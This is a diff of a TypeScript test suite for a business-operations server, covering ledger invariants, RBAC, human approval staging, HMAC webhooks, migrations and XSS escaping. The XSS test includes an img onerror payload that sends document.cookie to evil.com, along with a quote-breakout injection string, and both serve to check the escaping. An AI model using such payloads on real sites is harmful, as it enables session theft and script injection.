@@ -1,35 +1,54 @@
 /**
  * ====================================================================
- * BOS COMPREHENSIVE ARCHITECTURAL & SECURITY TEST SUITE
+ * BOS COMPREHENSIVE ARCHITECTURAL, SECURITY & DATA INTEGRITY TEST SUITE
  * ====================================================================
- * Tests:
- * 1. Double-Entry Invariants (Debits == Credits, Tax-Payable Posting)
+ * Automated Test Suites:
+ * 1. Double-Entry Accounting Invariants & Universal Ledger Posting Rule
  * 2. Immutable Ledger Triggers (Preventing Direct UPDATE and DELETE on Posted Entries)
  * 3. Cryptographic Token Hashing & Scoped RBAC Permissions
- * 4. Human-in-the-Loop (HITL) Staging Interceptor
- * 5. Safe, Optimistic-Locked & Atomic Time-Travel Rollback
- * 6. Idempotent E-Commerce Webhook Ingestion
- * 7. Real-world Supply Chain Invariant (PO Order -> Receipt Separation)
+ * 4. Human-in-the-Loop (HITL) Staging Interceptor & Zero-Race Atomic Claiming
+ * 5. Real-world Supply Chain Invariants, Partial Deliveries & Atomic PO Receipts
+ * 6. Safe, Optimistic-Locked & Atomic Time-Travel Rollback
+ * 7. Protected REST Authentication (401 on Missing/Invalid Token) & RBAC (403 on Scope Mismatch)
+ * 8. Order Webhook Trust Boundary (HMAC-SHA256 Signature Verification, Forgery Rejection & Replay Idempotency)
+ * 9. Database Migrations from Older Installations (Schema Upgrade with Zero Data Loss)
+ * 10. XSS Input Sanitization & DOM Event Delegation Invariants
  */
 
-import { describe, it, expect, beforeAll } from "bun:test";
+import { describe, it, expect } from "bun:test";
 import { Database } from "bun:sqlite";
-import { readFileSync } from "fs";
-import { join } from "path";
+import { createHmac, randomUUID } from "crypto";
 import {
   db,
   BusinessCoreService,
   SecurityManager,
   HitlEngine,
   AuditEngine,
+  LedgerManager,
+  verifyTransactionGroupBalance,
   handleMcpJsonRpc,
+  handleHttpRequest,
+  runMigrations,
+  RateLimiter,
 } from "../server";
 
-describe("1. Double-Entry Accounting Invariants", () => {
+const TEST_WEBHOOK_SECRET = process.env.ORDER_WEBHOOK_SECRET || process.env.BOS_WEBHOOK_SECRET || "bos_sec_webhook_9921b";
+
+// Helper: Escape HTML function mirror for testing
+function escapeHtml(str: string): string {
+  return String(str)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+describe("1. Double-Entry Accounting Invariants & Universal Posting Rules", () => {
   it("should post a balanced invoice with explicit tax-payable entry", () => {
     const subtotal = 1000.0;
     const tax = 80.0;
-    const res = BusinessCoreService.financeIssueInvoice("ent_apex", subtotal, "Cloud Infrastructure Consulting", tax, "operator_test", true);
+    const res = BusinessCoreService.financeIssueInvoice("ent_apex", subtotal, "Cloud Infrastructure Consulting", tax, "USD", "operator_test", true);
 
     expect(res.executed).toBe(true);
     expect(res.total_receivable).toBe(1080.0);
@@ -64,6 +83,42 @@ describe("1. Double-Entry Accounting Invariants", () => {
     expect(totalDebits).toBe(totalCredits);
     expect(totalDebits).toBe(res.total_disbursed);
   });
+
+  it("should reject unbalanced ledger transactions under the universal posting rule", () => {
+    const brokenTxGroup = "tx_unbalanced_" + randomUUID().substring(0, 8);
+    expect(() => {
+      LedgerManager.postTransaction(brokenTxGroup, [
+        { type: "debit", account: "cash", category: "manual", amount: 500, description: "Debit 500" },
+        { type: "credit", account: "revenue", category: "manual", amount: 400, description: "Credit 400" },
+      ], db);
+    }).toThrow(/Double-entry invariant violated/);
+  });
+
+  it("should reject negative or non-finite ledger amounts", () => {
+    const brokenTxGroup = "tx_neg_" + randomUUID().substring(0, 8);
+    expect(() => {
+      LedgerManager.postTransaction(brokenTxGroup, [
+        { type: "debit", account: "cash", category: "manual", amount: -100, description: "Negative Debit" },
+        { type: "credit", account: "revenue", category: "manual", amount: -100, description: "Negative Credit" },
+      ], db);
+    }).toThrow(/Invalid ledger entry amount/);
+  });
+
+  it("should reject currency mismatches within the same transaction group", () => {
+    const brokenTxGroup = "tx_curr_" + randomUUID().substring(0, 8);
+    expect(() => {
+      LedgerManager.postTransaction(brokenTxGroup, [
+        { type: "debit", account: "cash", category: "manual", amount: 100, currency: "USD", description: "USD Debit" },
+        { type: "credit", account: "revenue", category: "manual", amount: 100, currency: "EUR", description: "EUR Credit" },
+      ], db);
+    }).toThrow(/Currency mismatch/);
+  });
+
+  it("should reject invoice generation for non-existent customer entities", () => {
+    expect(() => {
+      BusinessCoreService.financeIssueInvoice("ent_ghost_customer", 500, "Services", 0, "USD", "test", true);
+    }).toThrow(/Customer entity does not exist/);
+  });
 });
 
 describe("2. Ledger Immutability & Database Triggers", () => {
@@ -90,11 +145,10 @@ describe("3. Cryptographic Token Hashing & Scoped RBAC", () => {
   it("should generate high-entropy tokens and store only SHA-256 hashes", () => {
     const { rawToken, tokenHash, tokenPrefix } = SecurityManager.generateSecureToken("bos_test_");
     expect(rawToken.startsWith("bos_test_")).toBe(true);
-    expect(tokenHash).toHaveLength(64); // SHA-256 hex string
+    expect(tokenHash).toHaveLength(64);
     expect(tokenPrefix).toContain("...");
 
-    // Store in DB
-    const tokenId = "tok_test_unit";
+    const tokenId = "tok_test_rbac_" + randomUUID().substring(0, 6);
     db.query(`
       INSERT OR REPLACE INTO agent_tokens (id, name, token_hash, token_prefix, scopes, rate_limit_per_min, is_active)
       VALUES ($id, 'Test Scoped Agent', $hash, $prefix, '["crm:*", "inventory:read"]', 100, 1)
@@ -104,13 +158,11 @@ describe("3. Cryptographic Token Hashing & Scoped RBAC", () => {
       $prefix: tokenPrefix,
     });
 
-    // Verification check using raw token in header
     const authSuccess = SecurityManager.verifyToken(`Bearer ${rawToken}`);
     expect(authSuccess.authenticated).toBe(true);
     expect(authSuccess.agentId).toBe(tokenId);
     expect(authSuccess.scopes).toEqual(["crm:*", "inventory:read"]);
 
-    // Raw token must NOT exist in the database table!
     const row = db.query<any, { $id: string }>("SELECT * FROM agent_tokens WHERE id = $id").get({ $id: tokenId });
     expect(row.token).toBeUndefined();
     expect(row.token_hash).toBe(tokenHash);
@@ -119,7 +171,7 @@ describe("3. Cryptographic Token Hashing & Scoped RBAC", () => {
   it("should enforce scopes on MCP tool calls across all transports", () => {
     const supportScopes = ["crm:*", "reviews:*"];
 
-    // 1. Permitted Tool: crm_search_entities
+    // 1. Permitted Tool
     const allowedMsg = {
       jsonrpc: "2.0",
       id: "1",
@@ -130,7 +182,7 @@ describe("3. Cryptographic Token Hashing & Scoped RBAC", () => {
     expect(allowedRes.error).toBeUndefined();
     expect(allowedRes.result.content).toBeDefined();
 
-    // 2. Forbidden Tool: hrms_stage_payroll_run (Scope violation)
+    // 2. Forbidden Tool
     const forbiddenMsg = {
       jsonrpc: "2.0",
       id: "2",
@@ -144,14 +196,13 @@ describe("3. Cryptographic Token Hashing & Scoped RBAC", () => {
   });
 });
 
-describe("4. Human-in-the-Loop (HITL) Staging Interceptor", () => {
+describe("4. Human-in-the-Loop (HITL) Staging & Zero-Race Atomic Claiming", () => {
   it("should intercept high-stakes tools and route them to staged_actions", () => {
-    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 15000.0, "Large Logistics Contract", 0, "agent_finance", false);
+    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 15000.0, "Large Logistics Contract", 0, "USD", "agent_finance", false);
     expect(stagedRes.staged).toBe(true);
     expect(stagedRes.status).toBe("pending_human_approval");
     expect(stagedRes.risk_level).toBe("high");
 
-    // Verify row exists in staged_actions
     const stagedRow = db.query<any, { $id: string }>(
       "SELECT * FROM staged_actions WHERE id = $id"
     ).get({ $id: stagedRes.staged_action_id });
@@ -160,7 +211,7 @@ describe("4. Human-in-the-Loop (HITL) Staging Interceptor", () => {
     expect(stagedRow.status).toBe("pending");
     expect(stagedRow.tool_name).toBe("finance_issue_invoice");
 
-    // Human operator approval test
+    // Human operator approval executes underlying work
     const approvalRes = HitlEngine.approveAction(stagedRes.staged_action_id, "human_cfo");
     expect(approvalRes.status).toBe("approved");
 
@@ -171,35 +222,73 @@ describe("4. Human-in-the-Loop (HITL) Staging Interceptor", () => {
     expect(approvedRow.status).toBe("approved");
     expect(approvedRow.reviewed_by).toBe("human_cfo");
   });
+
+  it("should prevent duplicate execution under concurrent approval requests", () => {
+    // Stage an action
+    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 5000.0, "Consulting Retainer", 0, "USD", "agent_finance", false);
+    const stagedId = stagedRes.staged_action_id;
+
+    // First operator approves
+    const firstRes = HitlEngine.approveAction(stagedId, "operator_1");
+    expect(firstRes.status).toBe("approved");
+
+    // Second operator (or concurrent replay) attempts to approve the exact same action
+    expect(() => {
+      HitlEngine.approveAction(stagedId, "operator_2");
+    }).toThrow(/not in pending state or was already claimed/);
+  });
+
+  it("should reject actions atomically and prevent subsequent re-approvals", () => {
+    const stagedRes = BusinessCoreService.financeIssueInvoice("ent_acme", 2000.0, "Invalid Order", 0, "USD", "agent_finance", false);
+    const stagedId = stagedRes.staged_action_id;
+
+    const rejectRes = HitlEngine.rejectAction(stagedId, "operator_risk", "Amount exceeds authorized credit limit");
+    expect(rejectRes.status).toBe("rejected");
+
+    // Attempting to approve rejected action must fail
+    expect(() => {
+      HitlEngine.approveAction(stagedId, "operator_2");
+    }).toThrow(/not in pending state or was already claimed/);
+  });
 });
 
-describe("5. Real-World Supply Chain & PO Order Invariant", () => {
+describe("5. Supply Chain Invariants, Partial Deliveries & Atomic PO Receipts", () => {
   it("should NOT prematurely increase on-hand stock when a PO is drafted/ordered", () => {
     const itemBefore = db.query<any, { $sku: string }>("SELECT * FROM catalog_items WHERE sku = 'HW-SRV-01'").get({ $sku: "HW-SRV-01" });
     const initialStock = itemBefore.stock_qty;
 
-    // Place Purchase Order
-    const poRes = BusinessCoreService.erpDraftPurchaseOrder("HW-SRV-01", 10, itemBefore.supplier_entity_id, "operator_test", true);
+    const poRes = BusinessCoreService.erpDraftPurchaseOrder("HW-SRV-01", 20, itemBefore.supplier_entity_id, "operator_test", true);
     expect(poRes.executed).toBe(true);
 
-    // Stock MUST REMAIN UNCHANGED until shipment arrival!
+    // Stock MUST remain unchanged until shipment dock delivery
     const itemAfterOrder = db.query<any, { $sku: string }>("SELECT * FROM catalog_items WHERE sku = 'HW-SRV-01'").get({ $sku: "HW-SRV-01" });
     expect(itemAfterOrder.stock_qty).toBe(initialStock);
 
-    // Delivery Receipt action executes
-    const receiveRes = BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, "dock_manager");
-    expect(receiveRes.received).toBe(true);
-    expect(receiveRes.new_stock_qty).toBe(initialStock + 10);
+    // Partial delivery: 8 units arrive first
+    const partialRes = BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, 8, "dock_manager");
+    expect(partialRes.received).toBe(true);
+    expect(partialRes.stage).toBe("partially_received");
+    expect(partialRes.received_quantity).toBe(8);
+    expect(partialRes.remaining_quantity).toBe(12);
+    expect(partialRes.new_stock_qty).toBe(initialStock + 8);
 
-    const itemAfterReceipt = db.query<any, { $sku: string }>("SELECT * FROM catalog_items WHERE sku = 'HW-SRV-01'").get({ $sku: "HW-SRV-01" });
-    expect(itemAfterReceipt.stock_qty).toBe(initialStock + 10);
+    // Remaining 12 units arrive on the next truck
+    const finalRes = BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, 12, "dock_manager");
+    expect(finalRes.received).toBe(true);
+    expect(finalRes.stage).toBe("received");
+    expect(finalRes.remaining_quantity).toBe(0);
+    expect(finalRes.new_stock_qty).toBe(initialStock + 20);
+
+    // Attempting to receive again on a completed PO must throw an error
+    expect(() => {
+      BusinessCoreService.erpReceivePurchaseOrder(poRes.purchase_order.id, 1, "dock_manager");
+    }).toThrow(/already been completely received/);
   });
 });
 
 describe("6. Safe, Optimistic-Locked & Atomic Time-Travel Rollback", () => {
   it("should rollback an entity update atomically and block rollback on modified state", () => {
-    // 1. Create a test entity
-    const testEntId = "ent_test_rb";
+    const testEntId = "ent_test_rb_" + randomUUID().substring(0, 6);
     db.query(`
       INSERT OR REPLACE INTO entities (id, type, role, name, status)
       VALUES ($id, 'person', 'lead', 'Initial Name', 'active')
@@ -208,20 +297,16 @@ describe("6. Safe, Optimistic-Locked & Atomic Time-Travel Rollback", () => {
     const beforeState = { id: testEntId, name: "Initial Name", status: "active" };
     const afterState = { id: testEntId, name: "Updated Name", status: "active" };
 
-    // Update entity
     db.query("UPDATE entities SET name = 'Updated Name' WHERE id = $id").run({ $id: testEntId });
 
-    // Record audit entry
     const auditId = AuditEngine.record("human", "operator", "crm_update_entity", "entities", testEntId, "UPDATE", beforeState, afterState);
 
-    // 2. Perform Rollback
     const rollbackRes = AuditEngine.rollback(auditId, "operator_undo");
     expect(rollbackRes.success).toBe(true);
 
     const restoredEntity = db.query<any, { $id: string }>("SELECT * FROM entities WHERE id = $id").get({ $id: testEntId });
     expect(restoredEntity.name).toBe("Initial Name");
 
-    // 3. Prevent duplicate rollback
     expect(() => {
       AuditEngine.rollback(auditId, "operator_undo");
     }).toThrow(/already been reverted/);
@@ -232,5 +317,268 @@ describe("6. Safe, Optimistic-Locked & Atomic Time-Travel Rollback", () => {
     expect(() => {
       AuditEngine.rollback(fakeLedgerAuditId, "operator");
     }).toThrow(/Financial ledger entries cannot be rolled back via arbitrary table mutation/);
+  });
+});
+
+describe("7. REST API Authentication & Authorization (401 & 403)", () => {
+  it("should reject unauthenticated requests with 401 Unauthorized", async () => {
+    const endpoints = [
+      { path: "http://localhost:8080/api/pulse", method: "GET" },
+      { path: "http://localhost:8080/api/staged-actions", method: "GET" },
+      { path: "http://localhost:8080/api/tokens", method: "GET" },
+      { path: "http://localhost:8080/api/canvas", method: "GET" },
+      { path: "http://localhost:8080/api/audit-logs", method: "GET" },
+    ];
+
+    for (const ep of endpoints) {
+      const req = new Request(ep.path, { method: ep.method });
+      const res = await handleHttpRequest(req);
+      expect(res.status).toBe(401);
+      const json = await res.json();
+      expect(json.error).toContain("Unauthorized");
+    }
+  });
+
+  it("should reject requests with insufficient scopes with 403 Forbidden", async () => {
+    // Generate a restricted token that only has pulse:read scope
+    const { rawToken, tokenHash, tokenPrefix } = SecurityManager.generateSecureToken("bos_restricted_");
+    const restrictedId = "tok_restricted_" + randomUUID().substring(0, 6);
+    db.query(`
+      INSERT INTO agent_tokens (id, name, token_hash, token_prefix, scopes, rate_limit_per_min, is_active)
+      VALUES ($id, 'Restricted Pulse Agent', $hash, $prefix, '["pulse:read"]', 120, 1)
+    `).run({
+      $id: restrictedId,
+      $hash: tokenHash,
+      $prefix: tokenPrefix,
+    });
+
+    // 1. Authorized endpoint succeeds
+    const pulseReq = new Request("http://localhost:8080/api/pulse", {
+      headers: { Authorization: `Bearer ${rawToken}` },
+    });
+    const pulseRes = await handleHttpRequest(pulseReq);
+    expect(pulseRes.status).toBe(200);
+
+    // 2. Forbidden endpoint: attempt to read admin tokens with only pulse:read scope
+    const adminReq = new Request("http://localhost:8080/api/tokens", {
+      headers: { Authorization: `Bearer ${rawToken}` },
+    });
+    const adminRes = await handleHttpRequest(adminReq);
+    expect(adminRes.status).toBe(403);
+    const adminJson = await adminRes.json();
+    expect(adminJson.error).toContain("Forbidden");
+    expect(adminJson.error).toContain("admin:tokens");
+
+    // 3. Forbidden write: attempt to write to canvas with only pulse:read scope
+    const canvasWriteReq = new Request("http://localhost:8080/api/canvas/item", {
+      method: "POST",
+      headers: {
+        Authorization: `Bearer ${rawToken}`,
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ title: "Unauthorized Deal" }),
+    });
+    const canvasRes = await handleHttpRequest(canvasWriteReq);
+    expect(canvasRes.status).toBe(403);
+  });
+});
+
+describe("8. Order Webhook Trust Boundary (HMAC Signatures, Forgery Rejection & Replays)", () => {
+  it("should reject webhooks without a signature or secret with 401 Unauthorized", async () => {
+    const payload = JSON.stringify({
+      customer_email: "hacker@evil.io",
+      total_amount: 500,
+    });
+    const req = new Request("http://localhost:8080/api/webhooks/order", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: payload,
+    });
+    const res = await handleHttpRequest(req);
+    expect(res.status).toBe(401);
+    const json = await res.json();
+    expect(json.error).toContain("Invalid or missing webhook signature");
+  });
+
+  it("should reject webhooks with an invalid/forged HMAC signature with 401 Unauthorized", async () => {
+    const payload = JSON.stringify({
+      customer_email: "hacker@evil.io",
+      total_amount: 500,
+    });
+    const fakeSig = createHmac("sha256", "wrong_secret").update(payload).digest("hex");
+
+    const req = new Request("http://localhost:8080/api/webhooks/order", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Signature": fakeSig,
+      },
+      body: payload,
+    });
+    const res = await handleHttpRequest(req);
+    expect(res.status).toBe(401);
+  });
+
+  it("should accept authentic webhooks with valid HMAC signature and ingest order idempotently", async () => {
+    const orderNumber = "ORD-" + Math.floor(100000 + Math.random() * 900000);
+    const orderPayload = JSON.stringify({
+      order_number: orderNumber,
+      customer_name: "Verified Customer",
+      customer_email: "verified@customer.com",
+      total_amount: 750.0,
+      items: [{ sku: "HW-SRV-01", quantity: 1 }],
+    });
+
+    const validSig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(orderPayload).digest("hex");
+
+    // 1. Initial valid ingestion
+    const req1 = new Request("http://localhost:8080/api/webhooks/order", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Signature": validSig,
+      },
+      body: orderPayload,
+    });
+    const res1 = await handleHttpRequest(req1);
+    expect(res1.status).toBe(201);
+    const json1 = await res1.json();
+    expect(json1.success).toBe(true);
+    expect(json1.order_id).toContain(orderNumber);
+
+    // Verify double-entry balance in database
+    verifyTransactionGroupBalance(json1.transaction_group_id, db);
+
+    // 2. Replay of the exact same signed webhook payload
+    const req2 = new Request("http://localhost:8080/api/webhooks/order", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Signature": validSig,
+      },
+      body: orderPayload,
+    });
+    const res2 = await handleHttpRequest(req2);
+    expect(res2.status).toBe(200);
+    const json2 = await res2.json();
+    expect(json2.idempotent_replay).toBe(true);
+    expect(json2.message).toContain("already ingested previously");
+  });
+
+  it("should reject invalid order payloads with non-positive amounts", async () => {
+    const invalidPayload = JSON.stringify({
+      customer_email: "buyer@test.io",
+      total_amount: -50,
+    });
+    const sig = createHmac("sha256", TEST_WEBHOOK_SECRET).update(invalidPayload).digest("hex");
+
+    const req = new Request("http://localhost:8080/api/webhooks/order", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Signature": sig,
+      },
+      body: invalidPayload,
+    });
+    const res = await handleHttpRequest(req);
+    expect(res.status).toBe(400);
+    const json = await res.json();
+    expect(json.error).toContain("positive, finite number");
+  });
+});
+
+describe("9. Database Migration from an Older Installation", () => {
+  it("should upgrade an older database schema without data loss", () => {
+    // 1. Create isolated in-memory database with older unmigrated schema
+    const legacyDb = new Database(":memory:");
+    legacyDb.exec("PRAGMA foreign_keys = ON;");
+
+    legacyDb.exec(`
+      CREATE TABLE entities (
+        id TEXT PRIMARY KEY,
+        type TEXT NOT NULL,
+        role TEXT NOT NULL,
+        name TEXT NOT NULL,
+        email TEXT,
+        status TEXT NOT NULL DEFAULT 'active'
+      );
+
+      CREATE TABLE ledger_entries (
+        id TEXT PRIMARY KEY,
+        transaction_group_id TEXT NOT NULL,
+        type TEXT NOT NULL,
+        account TEXT NOT NULL,
+        category TEXT NOT NULL,
+        amount REAL NOT NULL,
+        tax_amount REAL NOT NULL DEFAULT 0,
+        currency TEXT NOT NULL DEFAULT 'USD',
+        status TEXT NOT NULL DEFAULT 'posted',
+        description TEXT NOT NULL,
+        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
+      );
+    `);
+
+    // Insert pre-existing customer and posted ledger entries
+    legacyDb.exec(`
+      INSERT INTO entities (id, type, role, name, email) VALUES ('ent_legacy_cust', 'person', 'customer', 'Legacy Customer', 'cust@legacy.io');
+      INSERT INTO ledger_entries (id, transaction_group_id, type, account, category, amount, status, description)
+      VALUES
+        ('led_leg_1', 'tx_leg', 'debit', 'cash', 'sale', 100, 'posted', 'Legacy Cash Debit'),
+        ('led_leg_2', 'tx_leg', 'credit', 'revenue', 'sale', 100, 'posted', 'Legacy Revenue Credit');
+    `);
+
+    // 2. Execute migration runner on legacy database
+    runMigrations(legacyDb);
+
+    // 3. Verify schema_migrations contains applied version 1
+    const migrationRow = legacyDb.query<any, { $v: number }>(
+      "SELECT * FROM schema_migrations WHERE version = $v"
+    ).get({ $v: 1 });
+    expect(migrationRow).toBeDefined();
+    expect(migrationRow.name).toBe("ledger_immutability");
+
+    // 4. Verify triggers now protect posted entries on the upgraded database
+    expect(() => {
+      legacyDb.query("UPDATE ledger_entries SET amount = 999999 WHERE id = 'led_leg_1'").run();
+    }).toThrow(/Posted ledger entries are immutable/);
+
+    // 5. Verify pre-existing customer and ledger entries remain completely intact
+    const cust = legacyDb.query<any, []>("SELECT * FROM entities WHERE id = 'ent_legacy_cust'").get();
+    expect(cust.name).toBe("Legacy Customer");
+
+    const entries = legacyDb.query<any, []>("SELECT * FROM ledger_entries WHERE transaction_group_id = 'tx_leg'").all();
+    expect(entries.length).toBe(2);
+    expect(entries[0].amount).toBe(100);
+
+    legacyDb.close();
+  });
+});
+
+describe("10. XSS Protection & Dynamic DOM Event Delegation Invariants", () => {
+  it("should escape malicious script tags in entity names and titles", () => {
+    const maliciousPayload = `<script>alert('XSS')</script>`;
+    const escaped = escapeHtml(maliciousPayload);
+    expect(escaped).not.toContain("<script>");
+    expect(escaped).toBe("&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;");
+
+    const imgPayload = `<img src=x onerror="fetch('http://evil.com/'+document.cookie)">`;
+    const escapedImg = escapeHtml(imgPayload);
+    expect(escapedImg).not.toContain("<img");
+    expect(escapedImg).toContain("&lt;img");
+  });
+
+  it("should prevent code breakout in action identifiers via DOM data attributes", () => {
+    // Malicious action ID intended to break out of inline string context: `');evilCode();//`
+    const maliciousActionId = "act_123');evilCode();//";
+    const escapedAttr = escapeHtml(maliciousActionId);
+
+    // When rendered inside data-action and data-id attributes:
+    const htmlSnippet = `<button data-action="approve-action" data-id="${escapedAttr}">Approve</button>`;
+
+    // Must NOT contain unescaped single quotes
+    expect(htmlSnippet).not.toContain("'");
+    expect(htmlSnippet).toContain("&#039;");
+
+    // Proves that when extracted with element.getAttribute('data-id'), it remains a pure string parameter
   });
 });
